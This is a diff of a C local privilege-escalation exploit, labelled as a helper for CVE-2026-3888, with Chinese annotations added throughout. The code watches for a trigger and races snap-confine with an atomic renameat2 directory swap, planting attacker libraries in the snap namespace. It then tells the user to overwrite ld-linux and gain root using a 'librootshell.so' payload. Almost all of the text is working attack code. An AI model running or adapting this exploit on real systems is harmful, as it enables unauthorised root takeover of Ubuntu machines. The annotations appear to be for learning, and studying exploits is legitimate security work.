@@ -255,13 +255,15 @@ static int run_and_race(void)
         ringpos++;    //ringpos：当前写入的“总位置计数”（一直递增）
         //从环形缓冲区里取“最近 tlen 个字节” ,ringbuf = 一个循环的录音带 ,ringpos = 当前录音位置, 录满之后：会覆盖最旧的声音
 
-        /* 一旦我们有足够的字节，检查触发器 */
+        /* 一旦我们有足够的字节，检查触发器 */ //“已经写入的数据量 >= TRIGGER长度”
         if (!swapped && ringpos >= tlen) { //!swapped：还没执行过交换（只允许一次）,ringpos >= tlen：缓冲区里至少有 tlen 个字节，才有可能匹配完整的 TRIGGER
             for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)  //从环形缓冲区里取“最近 tlen 个字节”
                 check[i] = ringbuf[(ringpos-tlen + i) % sizeof(ringbuf)];
             check[tlen] = '\0';
+         //从“环形缓冲区”里取出最近的 tlen 个字节，拼成一个字符串 check，用于后续检测（比如 strstr 匹配 TRIGGER）
+         //从输入流里取“最近 tlen 个字符”，看这些字符里有没有 TRIGGER
 
-            if (strstr(check, TRIGGER)) {
+            if (strstr(check, TRIGGER)) { //如果 check 这个字符串里 包含 TRIGGER 这段内容
                 printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
 
                 /* 触发命中：快照限制暂停后，步骤1-安全交换 */
@@ -273,11 +275,11 @@ static int run_and_race(void)
                             AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
                  //SYS_renameat2 系统调用号,AT_FDCWD表示“当前工作目录"，EXCHANGE_DST目标路径(被替换的),EXCHANGE_SRC源路径(用来替换的),RENAME_EXCHANGE交换而不是覆盖
                  //瞬间完成，没有中间状态，这对 race 极其关键
-                    /* 原子交换成功 */
+                    /* Atomic swap succeeded原子交换成功 */
                 } else {
                     /* 如果renameat2不可用（非原子），则回退) */
-                    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
-                    rename(EXCHANGE_SRC, EXCHANGE_DST);
+                    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");   //把 EXCHANGE_DST 这个文件/目录,改名移动到备份路径 .snap/...orig
+                    rename(EXCHANGE_SRC, EXCHANGE_DST);   //把 EXCHANGE_SRC 改名成 EXCHANGE_DST
                 }
 
                 swapped = 1;
@@ -287,34 +289,34 @@ static int run_and_race(void)
         }
     }
     close(read_fd);
-    int status;
-    waitpid(pid, &status, 0);
-    if (swapped)
+    int status; \\status 保存：子进程是正常退出 / 崩溃 / 被信号杀死 等信息
+    waitpid(pid, &status, 0);  //等 pid 这个子进程执行完，然后把它的退出状态存到 status 里
+    if (swapped) //swapped 是一个全局/共享状态变量,是否成功触发交换逻辑（RENAME_EXCHANGE / race condition 成功),swapped为1触发成功(race赢了),swapped为0没触发成功
         printf("[+] Race won! Our libraries are in the namespace.\n");
     else
         printf("[-] Trigger not detected. Race lost.\n");
-    return swapped ? 0 :-1;
+    return swapped ? 0 :-1; //程序对外的返回值 成功和失败， 对外：函数返回值遵循约定（Linux/Unix 习惯）｜ 对内：状态（通常 bool 或 int）自由定义
 }
 
-int main(int argc, char *argv[])
+int main(int argc, char *argv[]) //argc:argument count 命令行参数个数| argv[]:argument vector 命令行参数列表（字符串数组） “字符串指针数组”
 {
-    if (argc < 2) {
+    if (argc < 2) { //如果用户没传 payload.so，就报错
         fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
         fprintf(stderr, "  payload.so: librootshell.so-the dynamic loader shellcode\n");
         return 1;
     }
     printf("[*] CVE-2026-3888-firefox 24.04 helper\n");
     printf("[*] Original research by Qualys (https://www.qualys.com)\n");
-    printf("[*] CWD: ");
-    fflush(stdout);
-    system("pwd");
+    printf("[*] CWD: ");//C 的 printf 默认是“缓冲输出”：
+    fflush(stdout); //把缓冲区里的输出立刻刷到屏幕
+    system("pwd"); //执行 shell 命令 pwd（打印当前目录）
     printf("[*] Setting up .snap and .exchange directory...\n");
 
-    if (setup_snap_and_exchange(argv[1]) < 0)
+    if (setup_snap_and_exchange(argv[1]) < 0) //用第一个参数（payload.so）初始化攻击环境,argv[1] = "payload.so"
         return 1;
     printf("[*] Starting race against snap-confine...\n");
-    if (run_and_race() < 0)
+    if (run_and_race() < 0) //race = 竞争条件（race condition）
         return 1;
-    printf("[+] Done. Proceed to Phase 4: overwrite ld-linux and trigger root.\n");
-    return 0;
+    printf("[+] Done. Proceed to Phase 4: overwrite ld-linux and trigger root.\n"); //“overwrite ld-linux”目标是劫持 Linux 动态链接器
+    return 0; //程序成功结束
 }
